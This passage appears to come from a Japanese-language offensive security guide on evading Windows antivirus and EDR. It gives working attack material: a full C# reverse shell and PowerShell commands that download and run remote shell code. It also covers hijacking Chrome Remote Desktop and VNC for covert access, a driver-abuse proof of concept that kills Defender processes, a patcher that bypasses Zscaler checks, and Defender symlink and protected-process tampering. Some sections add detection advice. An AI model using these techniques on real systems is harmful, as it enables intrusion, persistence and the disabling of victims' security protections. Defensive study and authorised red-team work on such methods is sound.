[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) に記載されているように、被害者の PC に Chrome Remote Desktop を導入して乗っ取り、永続化に利用するのは簡単です:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. 被害者側でインストーラーをサイレント実行します（管理者権限が必要）: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop のページに戻って Next をクリックします。ウィザードが承認を求めるので、Authorize ボタンをクリックして続行します。
4. 指定されたパラメータを一部調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).

## 高度な Evasion

Evasion は非常に複雑なテーマで、単一のシステム内でも多くの異なるテレメトリソースを考慮する必要があり、成熟した環境で完全に検出されない状態を維持するのはほぼ不可能です。

攻撃対象となる各環境はそれぞれ強みと弱みを持ちます。

より高度な Evasion 手法に関する足掛かりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94) のトークを見ることを強くお勧めします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは Evasion in Depth に関する [@mariuszbit](https://twitter.com/mariuszbit) の別の優れたトークです。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古い技術**

### **Defender が悪意ありと判断する部分を確認する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、**バイナリの一部を取り除き**ながら Defender がどの部分を悪意ありと判断しているかを特定して切り分けてくれます。\
同じことをする別のツールは [**avred**](https://github.com/dobin/avred) で、サービスを公開ウェブで提供しています: [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Windows10 までは、すべての Windows に **Telnet server** が付属しており、管理者として次のようにインストールできました:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システムが起動したときにそれを**開始**し、今**実行**してください:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnetポートを変更する** (stealth) と firewall を無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

ダウンロード先: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin ダウンロードを選び、setup ではなく)

**ON THE HOST**: _**winvnc.exe**_ を実行してサーバを設定する:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

その後、バイナリ _**winvnc.exe**_ と **新しく** 作成されたファイル _**UltraVNC.ini**_ を **victim** の中に移動する

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** ステルスを維持するために次のことはしてはいけません

- すでに実行中の場合は `winvnc` を起動しないこと。そうすると [popup](https://i.imgur.com/1SROTTl.png) が表示されます。実行中かどうかは `tasklist | findstr winvnc` で確認してください
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないこと。そうすると [the config window](https://i.imgur.com/rfMQWcf.png) が開きます
- ヘルプのために `winvnc -h` を実行しないこと。そうすると [popup](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

ダウンロード先: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に、`msfconsole -r file.rc` で **lister を起動** し、**xml payload** を **実行** します:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在、Defenderはプロセスを非常に速く終了させます。**

### 自前の reverse shell のコンパイル

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイルする:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
次のように使用します:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラの使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators リスト: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python を使った injectors のビルド例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からの AV/EDR の停止

Storm-2603 は小さなコンソールユーティリティである **Antivirus Terminator** を利用して、ランサムウェアを設置する前にエンドポイント保護を無効化しました。このツールは **独自の脆弱だが *signed* なドライバ** を持ち込み、それを悪用して Protected-Process-Light (PPL) な AV サービスであってもブロックできない特権カーネル操作を実行します。

要点
1. **Signed driver**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、実体のバイナリは Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正当に署名されたドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効な場合でもロードされます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行はドライバを **kernel service** として登録し、二行目で起動するため `\\.\ServiceMouse` がユーザランドからアクセス可能になります。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID で任意のプロセスを終了（Defender/EDR サービスを停止するために使用） |
| `0x990000D0` | ディスク上の任意ファイルを削除 |
| `0x990001D0` | ドライバをアンロードしてサービスを削除 |

最小限の C プルーフ・オブ・コンセプト:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD はユーザーモードの保護を完全にすり抜けます。カーネルで実行されるコードは *protected* なプロセスを開いたり、終了させたり、PPL/PP、ELAM やその他のハードニング機能に関係なくカーネルオブジェクトを改ざんできます。

Detection / Mitigation
•  Microsoft の脆弱ドライバブロックリスト（`HVCI`, `Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` のロードを拒否するようにする。  
•  新しい *kernel* サービスの作成を監視し、ドライバがワールドライト可能なディレクトリからロードされた場合や許可リストに存在しない場合にアラートを出す。  
•  カスタムデバイスオブジェクトへのユーザーモードハンドル作成と、それに続く疑わしい `DeviceIoControl` 呼び出しを監視する。

### On-Disk Binary Patching による Zscaler Client Connector の Posture チェック回避

Zscaler の **Client Connector** はデバイスの posture ルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC を利用します。設計上の弱点が二つあり、完全なバイパスを可能にします:

1. Posture 評価は **完全にクライアント側で実行される**（サーバへは boolean が送られるだけ）。  
2. 内部 RPC エンドポイントは、接続してくる実行ファイルが **Zscaler によって署名されている** ことだけを検証する（`WinVerifyTrust` 経由）。

ディスク上の署名済みバイナリを4つパッチすることで、両方の仕組みを無効化できます:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべてのチェックが合格となる |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP に置き換え ⇒ どんなプロセス（未署名でも）でも RPC パイプにバインドできる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換 |
| `ZSATunnel.exe` | Integrity checks on the tunnel | 短絡化される |

最小限のパッチャー抜粋:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後:

* **すべての** ポスチャチェックが **緑／準拠** と表示される。
* 署名されていない、または改変されたバイナリが named-pipe RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開ける。
* 侵害されたホストは、Zscaler ポリシーで定義された内部ネットワークに対して制限なしのアクセスを得る。

このケーススタディは、クライアント側のみの信頼判断や単純な署名チェックが、数バイトのパッチでいかに破られるかを示している。

## Protected Process Light (PPL) を悪用して LOLBINs で AV/EDR を改ざんする

Protected Process Light (PPL) は、署名者／レベルの階層を強制し、同等またはより高い保護レベルのプロセスのみが互いに改ざんできるようにする。攻撃的には、正当に PPL 対応のバイナリを起動して引数を制御できれば、ログ記録のような無害な機能を AV/EDR が使う保護されたディレクトリに対する制約付きの、PPL 裏付けの書き込みプリミティブに変換できる。

プロセスが PPL として動作する条件
- ターゲット EXE（およびロードされる DLL）は、PPL 対応の EKU で署名されている必要がある。
- プロセスは CreateProcess を使って次のフラグで作成される必要がある: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- バイナリの署名者に合致する互換な保護レベルを要求する必要がある（例: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` は anti-malware 署名者向け、`PROTECTION_LEVEL_WINDOWS` は Windows 署名者向け）。不適切なレベルは作成時に失敗する。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL（保護レベルを選択し、引数をターゲット EXE に転送する）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN プリミティブ: ClipUp.exe
- 署名済みのシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自身をスポーンし、呼び出し元が指定したパスにログファイルを書き込むパラメータを受け取ります。
- PPLプロセスとして起動すると、ファイル書き込みはPPLの保護下で行われます。
- ClipUpはスペースを含むパスを解析できません。通常保護された場所を指すには8.3短縮パスを使用してください。

8.3 short path helpers
- 短縮名を一覧表示: 各親ディレクトリで `dir /x` を実行。
- cmdで短縮パスを導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) ランチャー（例: CreateProcessAsPPL）を使い、`CREATE_PROTECTED_PROCESS` でPPL対応のLOLBIN（ClipUp）を起動する。
2) ClipUpのログパス引数を渡して、保護されたAVディレクトリ（例: Defender Platform）内でのファイル作成を強制する。必要なら8.3短縮名を使用する。
3) 対象バイナリが通常AVによって実行中に開かれ/ロックされている場合（例: MsMpEng.exe）、AVが起動する前のブート時に書き込みが行われるよう、より早く確実に実行される自動起動サービスをインストールしてスケジュールする。ブート順序は Process Monitor（boot logging）で検証する。
4) 再起動時にPPL保護された書き込みがAVがバイナリをロックする前に行われ、対象ファイルを破損させ起動不能にする。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事項と制約
- ClipUp が書き込む内容は配置位置以外で制御できません; このプリミティブは正確なコンテンツ注入よりも破損を目的としています。
- ローカル admin/SYSTEM が必要（サービスのインストール/開始および再起動の猶予が必要）。
- タイミングが重要: ターゲットは開かれていない必要があります; boot-time 実行はファイルロックを避けます。

検出
- 起動付近で、特に非標準のランチャーを親に持つ場合に、異常な引数での `ClipUp.exe` のプロセス作成。
- 自動起動に設定された疑わしいバイナリの新規サービスと、Defender/AV より一貫して先に起動しているケース。Defender の起動失敗に先行するサービスの作成/変更を調査する。
- Defender バイナリ/Platform ディレクトリに対するファイル整合性監視; protected-process フラグを持つプロセスによる予期しないファイル作成/変更。
- ETW/EDR テレメトリ: `CREATE_PROTECTED_PROCESS` で作成されたプロセスや、非-AV バイナリによる異常な PPL レベル使用を探す。

緩和策
- WDAC/Code Integrity: どの署名済みバイナリが PPL としてどの親の下で実行できるかを制限し、正当なコンテキスト外での ClipUp 呼び出しをブロックする。
- サービス管理: 自動起動サービスの作成/変更を制限し、起動順操作を監視する。
- Defender の tamper protection と early-launch protections を有効にする; バイナリの破損を示す起動エラーを調査する。
- 環境と互換性がある場合、セキュリティツールをホストするボリュームで 8.3 short-name 生成を無効にすることを検討する（十分にテストすること）。

PPL とツールの参考資料
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender は実行する platform を以下のサブフォルダを列挙して選択します:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

この中から辞書順で最も大きいバージョン文字列のサブフォルダ（例: `4.18.25070.5-0`）を選び、そこから Defender サービスプロセスを起動します（サービス/レジストリパスもそれに合わせて更新されます）。この選択はディレクトリ再解析ポイント（symlinks を含む）を信頼します。管理者はこれを悪用して Defender を攻撃者が書き込めるパスにリダイレクトし、DLL sideloading やサービス妨害を達成できます。

前提条件
- Local Administrator（Platform フォルダ配下にディレクトリ/シンボリックリンクを作成するために必要）
- 再起動または Defender platform の再選択を引き起こす能力（ブート時のサービス再起動）
- 組み込みツールのみで可能（mklink）

なぜ機能するか
- Defender は自フォルダへの書き込みをブロックしますが、platform 選択はディレクトリエントリを信頼し、ターゲットが保護/信頼されたパスに解決するかを検証せずに辞書順で最も大きいバージョンを選びます。

ステップバイステップ（例）
1) 現在の platform フォルダの書き込み可能なクローンを準備する（例: `C:\TMP\AV`）:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内にあなたのフォルダを指す、より高いバージョンのディレクトリ symlink を作成する:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスパスが `C:\TMP\AV\` の下に現れ、サービスの設定/レジストリがその場所を反映していることを確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリからロードする DLLs をドロップ／置換して、Defender のプロセス内でコードを実行させます。詳細は上のセクションを参照: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink を削除すると次回起動時に設定されたパスが解決されず、Defender が起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意: このテクニックは単体では privilege escalation を提供しません; admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、ターゲットの Import Address Table (IAT) をフックし、選択した APIs を attacker-controlled、position‑independent code (PIC) 経由にルーティングすることで、C2 implant にある runtime evasion をターゲットモジュール自身に移すことができます。これにより、多くの kits が露出する小さな API surface（例: CreateProcessA）を超えて evasion を一般化し、同じ保護を BOFs や post‑exploitation DLLs にも拡張します。

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注意事項
- パッチは relocations/ASLR の後、import の最初の使用前に適用する。Reflective loaders like TitanLdr/AceLdr は、ロードされたモジュールの DllMain 中にフックを行うことを示している。
- ラッパーは小さく PIC‑safe に保つ。真の API は、パッチ適用前に取得した元の IAT 値を使って解決するか、LdrGetProcedureAddress を介して解決する。
- PIC では RW → RX の遷移を使用し、writable+executable なページを残さない。

Call‑stack spoofing stub
- Draugr‑style PIC stubs は偽のコールチェーン（戻りアドレスを benign modules に向ける）を構築し、その後実際の API にピボットする。
- これにより、Beacon/BOFs から敏感な APIs への正規のスタックを期待する検知を回避できる。
- stack cutting/stack stitching 技術と組み合わせて、API のプロローグ前に期待されるフレーム内に降りるようにする。

運用統合
- reflective loader を post‑ex DLLs の先頭に付加して、DLL がロードされたときに PIC とフックが自動的に初期化されるようにする。
- Aggressor script を使ってターゲット API を登録すれば、Beacon と BOFs はコード変更なしに同じ回避経路の恩恵を受けられる。

検出 / DFIR に関する考慮事項
- IAT integrity: 非 image（heap/anon）アドレスに解決されるエントリ；import ポインタの定期的な検証。
- Stack anomalies: ロード済みイメージに属さない戻りアドレス；non‑image PIC への急な遷移；不整合な RtlUserThreadStart の親子関係。
- Loader telemetry: プロセス内での IAT への書き込み、import thunks を変更する早期の DllMain 活動、ロード時に作成される予期しない RX 領域。
- Image‑load evasion: LoadLibrary* をフックしている場合、automation/clr assemblies の疑わしいロードと memory masking events の相関を監視する。

関連するビルディングブロックと例
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
